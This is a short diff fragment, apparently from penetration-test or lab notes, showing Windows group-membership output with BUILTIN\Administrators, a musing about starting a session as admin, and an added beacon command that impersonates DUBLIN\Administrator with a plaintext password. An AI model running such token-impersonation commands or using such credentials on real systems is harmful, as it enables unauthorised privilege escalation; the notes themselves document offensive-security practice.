@@ -46,3 +46,5 @@ Everyone                                          Well-known group         S-1-1
 BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
 
 so we're in the administrators group?? lets try to start new seesion as admin?
+
+beacon> make_token DUBLIN\Administrator Passw0rd!
